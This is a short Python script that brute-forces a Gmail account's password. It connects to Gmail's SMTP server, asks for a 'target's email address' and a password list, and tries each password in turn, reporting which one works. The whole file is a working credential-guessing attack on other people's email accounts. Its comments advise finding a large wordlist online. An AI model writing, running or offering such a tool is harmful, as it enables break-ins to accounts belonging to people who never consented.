import smtplib # as you can see -_- declaring the SMTP  Library

smtpserver = smtplib.SMTP("smtp.gmail.com", 587) #SMTP Server Configs Just Follow the instructions of README.md for more informations
smtpserver.ehlo()
smtpserver.starttls()

user = input("Enter the target's email address: ")
passwfile = input("Enter the password file name: ")#Search For a Big One in the internet
passwfile = open(passwfile, "r")

for password in passwfile:
    try:
        smtpserver.login(user, password)

        print("[+] Password Found: %s" % password) # In Case One the passwords in the passlist works It Will return you "[+] Password Found: blablabla"

        break;
    except smtplib.SMTPAuthenticationError:
        print("[!] Password Incorrect: %s" % password) #In Case There is an error like password is Wrong or something related to this it will return you An Error message 
